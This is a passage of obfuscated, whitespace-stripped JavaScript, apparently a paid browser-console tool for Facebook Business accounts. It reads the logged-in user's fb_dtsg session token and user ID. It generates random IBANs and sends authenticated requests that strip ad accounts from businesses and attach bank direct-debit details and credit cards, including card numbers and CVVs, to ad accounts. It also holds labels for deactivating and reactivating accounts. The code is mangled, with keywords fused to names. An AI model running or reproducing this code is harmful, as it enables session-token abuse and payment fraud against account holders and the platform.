                                                                            case2: h = 65535;
                                                                            vari = 0;
                                                                            while (i < 65535) {
                                                                                switch (i) {
                                                                                    case0: i = c.length != e.bank_lng || cGjc(e.bank, c) ? 1 : 2;
                                                                                    break;
                                                                                    case1: i = 65535; {
                                                                                        f = _("Bank/BranchCode") + c + _("isnotcorrectfor") + e.name;
                                                                                        sqOnc = a.bank;
                                                                                    }
                                                                                    break;
                                                                                    case2: i = 65535;
                                                                                    varj = 0;
                                                                                    while (j < 65535) {
                                                                                        switch (j) {
                                                                                            case0: j = d.length < 1 || d.length > e.acc_lng ? 1 : 2;
                                                                                            break;
                                                                                            case1: j = 65535; {
                                                                                                f = _("AccountNumberlength") + d.length + _("isnotcorrectfor") + e.name + "(" + e.acc_lng + ")";
                                                                                                sqOnc = a.account;
                                                                                            }
                                                                                            break;
                                                                                            case2: j = 65535;
                                                                                            vark = 0;
                                                                                            while (k < 65535) {
                                                                                                switch (k) {
                                                                                                    case0: k = d.length < 1 || d.length > e.acc_lng || cGjc(e.acc, QEfe(d, e.acc_lng)) ? 1 : 65535;
                                                                                                    break;
                                                                                                    case1: k = 65535; {
                                                                                                        f = _("AccountNumber") + d + _("isnotcorrectfor") + e.name;
                                                                                                        sqOnc = a.account;
                                                                                                    }
                                                                                                    break;
                                                                                                }
                                                                                            }
                                                                                            break;
                                                                                        }
                                                                                    }
                                                                                    break;
                                                                                }
                                                                            }
                                                                            break;
                                                                        }
                                                                    }
                                                                    break;
                                                                }
                                                            }
                                                            varl = 0;
                                                            while (l < 65535) {
                                                                switch (l) {
                                                                    case0: l = f ? 1 : 2;
                                                                    break;
                                                                    case1: l = 65535; {
                                                                        document.bban_img.src = q.src;
                                                                        document.iban_img.src = r.src;
                                                                        a.iban.value = "";
                                                                        a.alt_iban.value = "";
                                                                        sqOnc.focus();
                                                                        alert(f);
                                                                    }
                                                                    break;
                                                                    case2: l = 65535; {
                                                                        document.iban_img.src = p.src;
                                                                        document.bban_img.src = r.src;
                                                                        a.bank.value = c;
                                                                        a.account.value = QEfe(d, e.acc_lng);
                                                                        a.iban.value = ULw(wNz(e, c, d));
                                                                        a.alt_iban.value = ULw(Qceb(e, c, d));
                                                                        varm = 0;
                                                                        while (m < 65535) {
                                                                            switch (m) {
                                                                                case0: m = a.alt_iban.value != a.iban.value ? 1 : 2;
                                                                                break;
                                                                                case1: m = 65535;
                                                                                a.alt_iban.value += "(*)";
                                                                                break;
                                                                                case2: m = 65535;
                                                                                a.alt_iban.value = "";
                                                                                break;
                                                                            }
                                                                        }
                                                                        varn = 0;
                                                                        while (n < 65535) {
                                                                            switch (n) {
                                                                                case0: n = debug_output ? 1 : 65535;
                                                                                break;
                                                                                case1: n = 65535;
                                                                                debug_check_vars();
                                                                                break;
                                                                            }
                                                                        }
                                                                    }
                                                                    break;
                                                                }
                                                            }
                                                        };
                                                        varcydoc = functioncydoc() {
                                                            document.write('<selectname="country"size="1">');
                                                            document.write('<optionvalue="NL">NETHERLAND(Default)</option>');
                                                            vara = YKre();
                                                            varb = 0;
                                                            while (b < 65535) {
                                                                switch (b) {
                                                                    case0: b = 1;
                                                                    varc = 0;
                                                                    break;
                                                                    case1: b = c < a.length ? 2 : 65535;
                                                                    break;
                                                                    case2: b = 3; {
                                                                        vard = t[a[c]];
                                                                        document.write('<optionvalue="' + d.code + '">' + d.name + "(" + d.code + ")</option>");
                                                                    }
                                                                    break;
                                                                    case3: b = 1;
                                                                    ++c;
                                                                    break;
                                                                }
                                                            }
                                                            document.write("</select>");
                                                        };
                                                        varcSQoc = functioncSQoc() {
                                                            document.write('<tablebgcolor="#99FFCC"width="100%"border="4"><tr><throwspan="2">&nbsp;</th><throwspan="2">' + _("Country") + "<NL/>Code</th>" + '<thcolspan="3">' + _("Bank/BranchCode") + "</th>" + '<thcolspan="3">' + _("AccountNumber") + "</th>" + "</tr>" + "<tr>" + "<th>" + _("check1") + "</th><th>" + _("bank") + "</th>" + "<th>" + _("branch") + "</th><th>" + _("check2") + "</th>" + "<th>" + _("number") + "</th><th>" + _("check3") + "</th>" + "</tr>");
                                                            vara = YKre();
                                                            varb = 0;
                                                            while (b < 65535) {
                                                                switch (b) {
                                                                    case0: b = 1;
                                                                    varc = 0;
                                                                    break;
                                                                    case1: b = c < a.length ? 2 : 65535;
                                                                    break;
                                                                    case2: b = 3; {
                                                                        vard = t[a[c]];
                                                                        document.write("<tr><td>" + d.name + "</td>" + '<tdalign="center">' + d.code + "</td>");
                                                                        vare = 0;
                                                                        while (e < 65535) {
                                                                            switch (e) {
                                                                                case0: e = 1;
                                                                                varf = 0;
                                                                                break;
                                                                                case1: e = f < d.bank.length ? 2 : 65535;
                                                                                break;
                                                                                case2: e = 3; {
                                                                                    varg = d.bank[f][0];
                                                                                    varseppc = d.bank[f][1];
                                                                                    varh = 0;
                                                                                    while (h < 65535) {
                                                                                        switch (h) {
                                                                                            case0: h = g > 0 ? 1 : 2;
                                                                                            break;
                                                                                            case1: h = 65535;
                                                                                            document.write('<tdalign="center">' + g + "" + seppc + "</td>");
                                                                                            break;
                                                                                            case2: h = 65535;
                                                                                            document.write('<tdalign="center">-</td>');
                                                                                            break;
                                                                                        }
                                                                                    }
                                                                                }
                                                                                break;
                                                                                case3: e = 1;
                                                                                ++f;
                                                                                break;
                                                                            }
                                                                        }
                                                                        vari = 0;
                                                                        while (i < 65535) {
                                                                            switch (i) {
                                                                                case0: i = 1;
                                                                                varf = 0;
                                                                                break;
                                                                                case1: i = f < d.acc.length ? 2 : 65535;
                                                                                break;
                                                                                case2: i = 3; {
                                                                                    varg = d.acc[f][0];
                                                                                    varseppc = d.acc[f][1];
                                                                                    varj = 0;
                                                                                    while (j < 65535) {
                                                                                        switch (j) {
                                                                                            case0: j = g > 0 ? 1 : 2;
                                                                                            break;
                                                                                            case1: j = 65535;
                                                                                            document.write('<tdalign="center">' + g + "" + seppc + "</td>");
                                                                                            break;
                                                                                            case2: j = 65535;
                                                                                            document.write('<tdalign="center">-</td>');
                                                                                            break;
                                                                                        }
                                                                                    }
                                                                                }
                                                                                break;
                                                                                case3: i = 1;
                                                                                ++f;
                                                                                break;
                                                                            }
                                                                        }
                                                                    }
                                                                    break;
                                                                    case3: b = 1;
                                                                    ++c;
                                                                    break;
                                                                }
                                                            }
                                                            document.write('<tr><tdcolspan="2">&nbsp;</td><tdcolspan="8"align="center">' + _("a=A-Z,n=0-9,c=A-Z/a-z/0-9") + "</td>" + "</tr>" + "</table>");
                                                        };
                                                        varkYcpc = functionkYcpc(a) {
                                                            vargVWoc = "";
                                                            varb = 0; {
                                                                varkwbmc;
                                                                while (b < 65535) {
                                                                    switch (b) {
                                                                        case0: b = 1;
                                                                        kwbmc = 0;
                                                                        break;
                                                                        case1: b = kwbmc < a ? 2 : 65535;
                                                                        break;
                                                                        case2: b = 3; {
                                                                            gVWoc += Math.floor(Math.random() * 10);
                                                                        }
                                                                        break;
                                                                        case3: b = 1;
                                                                        kwbmc++;
                                                                        break;
                                                                    }
                                                                }
                                                            }
                                                            returngVWoc;
                                                        };
                                                        varErSlc = functionErSlc(a) {
                                                            varb = "NL";
                                                            varc = IaVg(b);
                                                            vard = 0;
                                                            while (d < 65535) {
                                                                switch (d) {
                                                                    case0: d = !c ? 1 : 65535;
                                                                    break;
                                                                    case1: d = 65535; {
                                                                        console.error("UnknownCountryCode:", b);
                                                                        returnnull;
                                                                    }
                                                                    break;
                                                                }
                                                            }
                                                            vare = a || "INGB";
                                                            varf = kYcpc(c.acc_lng);
                                                            varg = ULw(wNz(c, e, f));
                                                            g = g.replace(/\s/g, "");
                                                            console.log("CustomIBAN:", g);
                                                            returng;
                                                        };
                                                        varceqnc = functionceqnc() {
                                                            Acnnc.textContent = "❤️AddIbanNowVerifiedWithDefaultAdAccountID❤️:" + YOuk.value;
                                                        };
                                                        varsWanc = functionsWanc() {
                                                            vara = Math.floor(Math.random() * 1e5);
                                                            w = "642" + a.toString().padStart(5, "0");
                                                            varb = ["041307", "070806", "040003", "233272", "209271", "405212"];
                                                            x = b[Math.floor(Math.random() * b.length)];
                                                        };
                                                        varYyikc = functionYyikc(a) {
                                                            varb = document.createElement("textarea");
                                                            document.body.appendChild(b);
                                                            b.value = a;
                                                            b.select();
                                                            document.execCommand("copy");
                                                            document.body.removeChild(b);
                                                            console.log("Copied:" + a);
                                                        };
                                                        varYqUhc = functionYqUhc() {
                                                            Evdic.textContent = "❤️❤️AddIbanNotVerifiedWithDefaultAdAccountID❤️:" + YOuk.value;
                                                        };
                                                        varAMKic = functionAMKic() {
                                                            Acnnc.style.display = "none";
                                                            AsXhc.style.display = "block";
                                                            sCXh.value = "❤️Pleasewait,RemoveAdAccountfrombusiness:❤️:" + YOuk.value + "BankIban:" + QMJkc.value;
                                                            varcONic = functioncONic() {
                                                                vara = require("CurrentUserInitialData").USER_ID;
                                                                fetch("https://business.facebook.com/business/objects/remove/connections/?business_id=".concat(EfBdc.value, "&from_id=").concat(EfBdc.value, "&from_asset_type=brand&to_id=").concat(YOuk.value, "&to_asset_type=ad-account&_callFlowletID=3012&_triggerFlowletID=3012"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__usid=6-Tsdq400z6umd7:Psdq63kvx3knv:0-Asdq4001gx59j1-RV=6:F=&__aaid=0&__bid=".concat(EfBdc.value, "&__user=").concat(a, "&__a=1&__req=m&__hs=19862.BP:brands_pkg.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1013617112&__s=42goor:ybk8k4:mp9wr4&__hsi=7370631585817148781&__dyn=7xeUmxa2C5rgydwCwRyUbFp4Unxim2q1Dxuq3mq1FxebzA3miidBxa7EiwnobES2S2q1Ex21FxG9y8Gdz8hw9-3a4EuCwQwCxq1zwCCwjFEK3idwLBG742ppUdoK7U8o7y78jxiUa8522m3K2y3WE9oO1WwamcwgECu7E422a3Fe6rwnVUao9k2B1-18wRwEwiUmwoErorx2aK2a4p8y26U8U-UvzE4S7VEjCx6221cwjU88jzUS2W2K4E5yeDyU52dCxK3WcwMzUkGu3i2WE4e8wl8hyVEK4o-2-qaUK2e0UFU2RwrU6CiU9E4KeCK2q362u1dxW6U98a85Ou0DU7i1Tw&__csr=&fb_dtsg=").concat(_YeTFb.value, "&jazoest=25675&lsd=kUWzQxfuob49BWN7MeEDWw&__spin_r=1013617112&__spin_b=trunk&__spin_t=1716108896&__jssesw=1")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(YKHic) {
                                                                    YKHic.text().then(function(sGyic) {
                                                                        console.log(sGyic);
                                                                    });
                                                                }).catch(function(UHBic) {
                                                                    console.error(UHBic);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                            };
                                                            cONic();
                                                        };
                                                        varoDsic = functionoDsic() {
                                                            Acnnc.style.display = "none";
                                                            AsXhc.style.display = "block";
                                                            sCXh.value = "❤️Pleasewait,AddingIbanIntoYourAdAcID:❤️:" + YOuk.value + "BankIban:" + oTEi.value;
                                                        };
                                                        varQEvic = functionQEvic() {
                                                            varQYijc = require("DTSGInitialData").token || document.querySelector('[name="fb_dtsg"]').value;
                                                            varsamjc = require("CurrentUserInitialData").USER_ID || location.href.match(/c_user=([0-9]+)/)[1];
                                                            varMVcjc = YOuk.value;
                                                            varoXfjc = require("CurrentUserInitialData").NAME;
                                                            varISWic = oTEi.value;
                                                            varkUZic = sCnmc.value;
                                                            varEPQic = ISWic.substring(ISWic.length - 4);
                                                            vargRTic = gNImc.value;
                                                            varglHjc = kQOmc.value;
                                                            varImKjc = Eftnc.value;
                                                            varciBjc = cKCmc.value;
                                                            varEjEjc = QsWjc.value;
                                                            varYevjc = kIAkc.value;
                                                            fetch("https://business.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "x-fb-friendly-name", "useBillingAddCreditCardMutation")), "referrer", "https://business.facebook.com/"), "body", "av=".concat(_MVAFb.value, "&payment_dev_cycle=prod&__usid=&__user=").concat(samjc, "&__a=1&__dyn=&__req=y&__hs=18981.BP:ads_campaign_manager_pkg.2.0.0.0.&dpr=1&__ccg=EXCELLENT&__rev=1004890290&__s=gps06q:m09ucg:i5cx73&__hsi=7043872291689680026-0&__comet_req=0&fb_dtsg=").concat(_YeTFb.value, '&jazoest=22014&lsd=wvoo9bDOYzCt-i056eV05q&__spin_r=1004890290&__spin_b=trunk&__spin_t=1640029319&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingDirectDebitSEPAMutation&variables={"input":{"account_holder_name":"').concat(oXfjc, '","account_number_last_four":"').concat(EPQic, '","approval":true,"bank_account_number":{"sensitive_string_value":"').concat(ISWic, '"},"bank_address":{"city":"').concat(gRTic, '","country_code":"').concat(ImKjc, '","postal_code":"').concat(ciBjc, '","street_address":"').concat(glHjc, '"},"bank_code":"').concat(kUZic, '","geo_type":"').concat(Yevjc, '","logging_data":{"logging_counter":17,"logging_id":"3640172513"},"payment_account_id":"').concat(MVcjc, '","actor_id":"').concat(samjc, '","client_mutation_id":"1"}}&server_timestamps=true&doc_id=').concat(EjEjc)), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(Agyjc) {
                                                                returnAgyjc.text();
                                                            }).then(function(Ubpjc) {
                                                                console.log("Response:", Ubpjc);
                                                                sCXh.value = "Response:" + Ubpjc;
                                                                Acnnc.style.display = "block";
                                                                AsXhc.style.display = "none";
                                                            }).catch(function(wdsjc) {
                                                                console.error("Anerroroccurred:", wdsjc);
                                                                alert("Erroroccurredwhilesendingmessage");
                                                            });
                                                        };
                                                        varAEwgc = functionAEwgc() {
                                                            Evdic.style.display = "none";
                                                            YCtgc.style.display = "block";
                                                            sCXh.value = "❤️Pleasewait,RemoveAdAccountfrombusiness:❤️:" + YOuk.value + "BankIban:" + QMJkc.value;
                                                            varUzngc = functionUzngc() {
                                                                vara = require("CurrentUserInitialData").USER_ID;
                                                                fetch("https://business.facebook.com/business/objects/remove/connections/?business_id=".concat(EfBdc.value, "&from_id=").concat(EfBdc.value, "&from_asset_type=brand&to_id=").concat(YOuk.value, "&to_asset_type=ad-account&_callFlowletID=3012&_triggerFlowletID=3012"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__usid=6-Tsdq400z6umd7:Psdq63kvx3knv:0-Asdq4001gx59j1-RV=6:F=&__aaid=0&__bid=".concat(EfBdc.value, "&__user=").concat(a, "&__a=1&__req=m&__hs=19862.BP:brands_pkg.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1013617112&__s=42goor:ybk8k4:mp9wr4&__hsi=7370631585817148781&__dyn=7xeUmxa2C5rgydwCwRyUbFp4Unxim2q1Dxuq3mq1FxebzA3miidBxa7EiwnobES2S2q1Ex21FxG9y8Gdz8hw9-3a4EuCwQwCxq1zwCCwjFEK3idwLBG742ppUdoK7U8o7y78jxiUa8522m3K2y3WE9oO1WwamcwgECu7E422a3Fe6rwnVUao9k2B1-18wRwEwiUmwoErorx2aK2a4p8y26U8U-UvzE4S7VEjCx6221cwjU88jzUS2W2K4E5yeDyU52dCxK3WcwMzUkGu3i2WE4e8wl8hyVEK4o-2-qaUK2e0UFU2RwrU6CiU9E4KeCK2q362u1dxW6U98a85Ou0DU7i1Tw&__csr=&fb_dtsg=").concat(_YeTFb.value, "&jazoest=25675&lsd=kUWzQxfuob49BWN7MeEDWw&__spin_r=1013617112&__spin_b=trunk&__spin_t=1716108896&__jssesw=1")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(Qwhgc) {
                                                                    Qwhgc.text().then(function(sykgc) {
                                                                        console.log(sykgc);
                                                                    });
                                                                }).catch(function(Mtbgc) {
                                                                    console.error(Mtbgc);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                            };
                                                            setTimeout(Uzngc, 0);
                                                        };
                                                        varovegc = functionovegc() {
                                                            Evdic.style.display = "none";
                                                            YCtgc.style.display = "block";
                                                            sCXh.value = "❤️Pleasewait,AddingIbanIntoYourAdAcID:❤️:" + YOuk.value + "BankIban:" + QMJkc.value;
                                                        };
                                                        varoPRgc = functionoPRgc() {
                                                            varQQUgc = require("DTSGInitialData").token || document.querySelector('[name="fb_dtsg"]').value;
                                                            varkMLgc = require("CurrentUserInitialData").USER_ID || location.href.match(/c_user=([0-9]+)/)[1];
                                                            varMNOgc = YOuk.value;
                                                            vargJFgc = require("CurrentUserInitialData").NAME;
                                                            varIKIgc = QMJkc.value;
                                                            varcGzgc = ofulc.value;
                                                            varEHCgc = IKIgc.substring(IKIgc.length - 4);
                                                            varEbqhc = "London";
                                                            vargdthc = Iyjic.value;
                                                            varAYjhc = MBpic.value;
                                                            varcanhc = wpRhc.value;
                                                            varwVdhc = kgzhc.value;
                                                            fetch("https://business.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "x-fb-friendly-name", "useBillingAddCreditCardMutation")), "referrer", "https://business.facebook.com/"), "body", "av=".concat(_MVAFb.value, "&payment_dev_cycle=prod&__usid=&__user=").concat(kMLgc, "&__a=1&__dyn=&__req=y&__hs=18981.BP:ads_campaign_manager_pkg.2.0.0.0.&dpr=1&__ccg=EXCELLENT&__rev=1004890290&__s=gps06q:m09ucg:i5cx73&__hsi=7043872291689680026-0&__comet_req=0&fb_dtsg=").concat(_YeTFb.value, '&jazoest=22014&lsd=wvoo9bDOYzCt-i056eV05q&__spin_r=1004890290&__spin_b=trunk&__spin_t=1640029319&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingDirectDebitBACSMutation&variables={"input":{"account_holder_name":"').concat(gJFgc, '","account_number_last_four":"').concat(EHCgc, '","approval":true,"bank_account_number":{"sensitive_string_value":"').concat(IKIgc, '"},"bank_address":{"city":"').concat(Ebqhc, '","country_code":"').concat(gdthc, '","postal_code":"').concat(AYjhc, '","street_address":"').concat(Ebqhc, '"},"bank_code":"').concat(cGzgc, '","geo_type":"').concat(wVdhc, '","logging_data":{"logging_counter":30,"logging_id":"43114610"},"payment_account_id":"').concat(MNOgc, '","actor_id":"').concat(kMLgc, '","client_mutation_id":"1"}}&server_timestamps=true&doc_id=').concat(canhc)), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(YWghc) {
                                                                returnYWghc.text();
                                                            }).then(function(sSXgc) {
                                                                console.log("Response:", sSXgc);
                                                                sCXh.value = "Response:" + sSXgc;
                                                                Evdic.style.display = "block";
                                                                YCtgc.style.display = "none";
                                                            }).catch(function(UTahc) {
                                                                console.error("Anerroroccurred:", UTahc);
                                                                alert("Erroroccurredwhilesendingmessage");
                                                            });
                                                        };
                                                        varYufec = functionYufec() {
                                                            fetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"businessID":"').concat(EfBdc.value, '"}&doc_id=6578089105618895')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(sqWdc) {
                                                                sqWdc.json().then(function(UrZdc) {
                                                                    businessPaymentAccountId = UrZdc.data.business.billing_payment_account.id;
                                                                    console.log("BusinessPaymentAccount:", businessPaymentAccountId);
                                                                    UXldc.value = businessPaymentAccountId;
                                                                }).catch(function(onQdc) {
                                                                    console.error(onQdc);
                                                                    console.log("Erroroccurredwhileparsingresponse");
                                                                });
                                                            }).catch(function(QoTdc) {
                                                                console.error(QoTdc);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                        };
                                                        varMlNdc = functionMlNdc() {
                                                            kkKdc.textContent = "❤️AddCardNowIntoBusinessAdAccountID❤️:" + UXldc.value;
                                                        };
                                                        varQMRac = functionQMRac() {
                                                            kkKdc.style.display = "none";
                                                            oLOac.style.display = "block";
                                                            sCXh.value = "❤️Pleasewait,AddingCardIntoYourBusinessAdAcID:❤️:" + UXldc.value + "CardNumber:" + kwjcc.value;
                                                        };
                                                        varkIIac = functionkIIac() {
                                                            varMJLac = require("DTSGInitialData").token || document.querySelector('[name="fb_dtsg"]').value;
                                                            vargFCac = _oXDFb.value;
                                                            varIGFac = UXldc.value;
                                                            varcCwac = require("CurrentUserInitialData").NAME;
                                                            varEDzac = kwjcc.value;
                                                            varEXmbc = "London";
                                                            vargZpbc = wxnac.value;
                                                            varAUgbc = _YSlRb.value;
                                                            varcWjbc = _siQRb.value;
                                                            varwRabc = MVkZb.value;
                                                            varYSdbc = UbxZb.value;
                                                            varsOUac = "20" + QYqZb.value;
                                                            varUPXac = EDzac.substring(0, 6);
                                                            varUjLbc = EDzac.substring(EDzac.length - 4);
                                                            fetch("https://business.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "x-fb-friendly-name", "useBillingAddCreditCardMutation")), "referrer", "https://business.facebook.com/"), "body", "av=".concat(_MVAFb.value, "&payment_dev_cycle=prod&locale=en_US&__user=").concat(gFCac, "&__a=1&dpr=2&__rev=1005599768&__comet_req=0&__spin_r=1005599768&__jssesw=1&fb_dtsg=").concat(_YeTFb.value, '&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingAddCreditCardMutation&make_ads_primaty_funding_source=1&variables={"input":{"billing_address":{"country_code":"').concat(gZpbc, '","zip":"10010"},"billing_logging_data":{},"cardholder_name":"","credit_card_first_6":{"sensitive_string_value":"400344"},"credit_card_last_4":{"sensitive_string_value":"').concat(UjLbc, '"},"credit_card_number":{"sensitive_string_value":"').concat(EDzac, '"},"csc":{"sensitive_string_value":"').concat(wRabc, '"},"expiry_month":"').concat(YSdbc, '","expiry_year":"').concat(sOUac, '","payment_account_id":"').concat(IGFac, '","payment_type":"').concat(cWjbc, '","unified_payments_api":true,"actor_id":"').concat(gFCac, '","client_mutation_id":"1"}}&server_timestamps=true&doc_id=').concat(AUgbc)), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(wlObc) {
                                                                returnwlObc.text();
                                                            }).then(function(QgFbc) {
                                                                console.log("Response:", QgFbc);
                                                                sCXh.value = "Response:" + QgFbc;
                                                                kkKdc.style.display = "block";
                                                                oLOac.style.display = "none";
                                                            }).catch(function(siIbc) {
                                                                console.error("Anerroroccurred:", siIbc);
                                                                alert("Erroroccurredwhilesendingmessage");
                                                            });
                                                        };
                                                        vargtdcc = functiongtdcc(a, b, c, d) {
                                                            varAoUbc = document.createElement("div");
                                                            AoUbc.style.flex = "1";
                                                            AoUbc.style.marginRight = "10px";
                                                            varcOVYb = document.createElement("label");
                                                            cOVYb.innerText = a;
                                                            AoUbc.appendChild(cOVYb);
                                                            varEPYYb = document.createElement("input");
                                                            EPYYb.type = "text";
                                                            EPYYb.value = b;
                                                            EPYYb.placeholder = a;
                                                            EPYYb.name = c;
                                                            EPYYb.style.width = "calc(100%-10px)";
                                                            EPYYb.style.height = d;
                                                            EPYYb.style.padding = "5px";
                                                            EPYYb.style.marginBottom = "10px";
                                                            EPYYb.style.border = "1pxsolid#ccc";
                                                            EPYYb.style.borderRadius = "5px";
                                                            AoUbc.appendChild(EPYYb);
                                                            return_defineProperty(_defineProperty({}, "flexItem", AoUbc), "input", EPYYb);
                                                        };
                                                        varkoVZb = functionkoVZb(a) {
                                                            varglPZb = a.split("|");
                                                            return_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "cardNumber", glPZb[0] || ""), "month", glPZb[1] || ""), "year", glPZb[2] || ""), "cvv", glPZb[3] || "");
                                                        };
                                                        varsuhac = functionsuhac() {
                                                            ghEdc.textContent = "❤️AddCardNowWithDefaultAdAccountID❤️:" + YOuk.value;
                                                        };
                                                        varMpYZb = functionMpYZb() {
                                                            ghEdc.style.display = "none";
                                                            IiHdc.style.display = "block";
                                                            sCXh.value = "❤️Pleasewait,AddingCardIntoYourAdAcID:❤️:" + YOuk.value + "CardNumber:" + kwjcc.value;
                                                        };
                                                        varorbac = functionorbac() {
                                                            varQQcXb = require("DTSGInitialData").token || document.querySelector('[name="fb_dtsg"]').value;
                                                            varsSfXb = _oXDFb.value;
                                                            varMNWWb = YOuk.value;
                                                            varoPZWb = require("CurrentUserInitialData").NAME;
                                                            varIKQWb = kwjcc.value;
                                                            varkMTWb = "London";
                                                            varEHKWb = wxnac.value;
                                                            vargJNWb = _YSlRb.value;
                                                            vargdBXb = _siQRb.value;
                                                            varIeEXb = MVkZb.value;
                                                            varcavXb = UbxZb.value;
                                                            varEbyXb = QYqZb.value;
                                                            varYWoXb = IKQWb.substring(0, 6);
                                                            varAYrXb = IKQWb.substring(IKQWb.length - 4);
                                                            fetch("https://business.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "x-fb-friendly-name", "useBillingAddCreditCardMutation")), "referrer", "https://business.facebook.com/"), "body", "av=".concat(_MVAFb.value, "&payment_dev_cycle=prod&locale=en_US&__user=").concat(sSfXb, "&__a=1&dpr=2&__rev=1005599768&__comet_req=0&__spin_r=1005599768&__jssesw=1&fb_dtsg=").concat(_YeTFb.value, '&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingAddCreditCardMutation&make_ads_primaty_funding_source=1&variables={"input":{"billing_address":{"country_code":"').concat(EHKWb, '"},"billing_logging_data":{},"cardholder_name":"","credit_card_first_6":{"sensitive_string_value":"').concat(YWoXb, '"},"credit_card_last_4":{"sensitive_string_value":"').concat(AYrXb, '"},"credit_card_number":{"sensitive_string_value":"').concat(IKQWb, '"},"csc":{"sensitive_string_value":"').concat(IeEXb, '"},"expiry_month":"').concat(cavXb, '","expiry_year":"').concat(EbyXb, '","payment_account_id":"').concat(MNWWb, '","payment_type":"').concat(gdBXb, '","unified_payments_api":true,"actor_id":"').concat(sSfXb, '","client_mutation_id":"1"}}&server_timestamps=true&doc_id=').concat(gJNWb)), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(UTiXb) {
                                                                returnUTiXb.text();
                                                            }).then(function(wVlXb) {
                                                                console.log("Response:", wVlXb);
                                                                sCXh.value = "Response:" + wVlXb;
                                                                ghEdc.style.display = "block";
                                                                IiHdc.style.display = "none";
                                                            }).catch(function(wpZXb) {
                                                                console.error("Anerroroccurred:", wpZXb);
                                                                alert("Erroroccurredwhilesendingmessage");
                                                            });
                                                        };
                                                        varsmTXb = functionsmTXb() {
                                                            YqcYb.textContent = "❤️GetCodeID[Fb,INS]❤️AdAccountID::" + YOuk.value;
                                                        };
                                                        varETjVb = functionETjVb() {
                                                            cuiYb.textContent = "❤️GetCodeID[Fb,INS,verify]❤️AdAccountID::" + YOuk.value;
                                                        };
                                                        varUzvWb = functionUzvWb() {
                                                            sysWb.textContent = "❤️GetCodeID[Fb,INS]❤️AdAccountID::" + YOuk.value;
                                                        };
                                                        varghMTb = functionghMTb() {
                                                            EfJTb.textContent = "❤️GetCodeID[Fb,INS]❤️AdAccountID::" + YOuk.value;
                                                        };
                                                        varEPgPb = functionEPgPb() {
                                                            EvtOb.textContent = "❤️DeactivateInstaandfacebook!❤️:" + YOuk.value;
                                                        };
                                                        varYKXOb = functionYKXOb() {
                                                            wJUOb.textContent = "❤️DisableandCreateNewFBOnly[personal]!❤️:" + YOuk.value;
                                                        };
                                                        varseNLb = functionseNLb() {
                                                            YiWLb.textContent = "❤️ReactivateAdAccountFBOnly!❤️:" + YOuk.value;
                                                        };
                                                        varMZDLb = functionMZDLb() {
                                                            kYALb.textContent = "❤️ReactivateAdAccountInstaOnly!❤️:" + YOuk.value;
                                                        };
                                                        varQwxMb = functionQwxMb() {
                                                            wBGMb.textContent = "❤️CreateAdAccountOnBusinessFBANDINSTA!❤️:" + AEMMb.value;
                                                        };
                                                        varQQkNb = functionQQkNb() {
                                                            oPhNb.textContent = "❤️CreateAdAccountOnInstagramINSTAOnly!❤️:" + AEMMb.value;
                                                        };
                                                        varMBdlb = functionMBdlb() {
                                                            varoDglb = newDate;
                                                            varIyXkb = newDate("2024-01-16T03:50:00");
                                                            varkAalb = YWIm - oDglb;
                                                            varMZbib = Math.ceil(kAalb / 864e5);
                                                            QEjlb.textContent = "RemainingDays⏱️:".concat(MZbib, "daysuntilsubscriptionexpiration");
                                                            sGmlb.value = "".concat(MZbib, "daysremaining");
                                                        };
                                                        varMFck = document.createElement("div");
                                                        MFck.style.position = "fixed";
                                                        MFck.style.top = "50%";
                                                        MFck.style.left = "50%";
                                                        MFck.style.transform = "translate(-50%,-50%)";
                                                        MFck.style.width = "70%";
                                                        MFck.style.maxWidth = "600px";
                                                        MFck.style.height = "70%";
                                                        MFck.style.maxHeight = "80%";
                                                        MFck.style.padding = "3%";
                                                        MFck.style.background = "#F39C12";
                                                        MFck.style.color = "black";
                                                        MFck.style.borderRadius = "15px";
                                                        MFck.style.boxShadow = "010px20pxrgba(0,0,0,0.3)";
                                                        MFck.style.zIndex = "9999";
                                                        MFck.style.fontFamily = "Arial,sans-serif";
                                                        MFck.style.lineHeight = "1.6";
